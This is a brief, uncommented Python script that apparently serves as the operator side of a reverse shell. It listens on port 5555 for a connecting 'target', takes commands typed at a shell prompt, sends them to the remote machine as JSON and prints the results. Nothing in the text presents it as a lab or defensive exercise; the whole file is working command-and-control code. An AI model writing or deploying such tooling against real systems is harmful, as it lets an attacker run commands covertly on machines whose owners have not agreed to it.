import socket
import sys
import json
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

sock.bind(('localhost', 5555))
sock.listen(5)

while True:
    target, ip = sock.accept()
    print(f"target connected from: {str(ip)}")
    while True:
        command = input('* Shell~%s: ' % str(ip))
        match command:
            case "quit":
                sys.exit()
            case _:
                try:
                    json_data = json.dumps(command)
                    target.send(json_data.encode())
                    data = target.recv(1024).decode().rstrip()
                    print(data)
                except Exception as err:
                    print(f"err {err}")
                    continue
